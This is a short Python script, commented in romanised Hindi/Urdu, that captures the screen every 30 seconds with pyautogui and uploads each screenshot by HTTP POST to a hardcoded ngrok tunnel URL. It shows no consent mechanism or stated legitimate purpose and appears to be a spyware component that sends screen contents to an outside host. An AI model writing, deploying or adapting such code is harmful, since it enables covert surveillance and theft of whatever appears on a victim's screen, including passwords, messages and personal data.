import requests
import pyautogui
import threading
import time

# YEH LINE BHUT ZAROORI HAI. APNA NGROK URL YAHAN DALIYE.
NGROK_URL = "https://salutational-nonrestrictedly-cristiano.ngrok-free.dev/upload" 

def start_sending_screenshots():
    """Yeh function har 30 second mein screenshot leta hai aur server ko bhejta hai."""
    while True:
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save("temp_screenshot.png")
            with open("temp_screenshot.png", "rb") as f:
                files = {'file': f}
                response = requests.post(NGROK_URL, files=files)
            print(f"Screenshot sent. Status: {response.status_code}")
        except Exception as e:
            print(f"Error sending screenshot: {e}")
        time.sleep(30)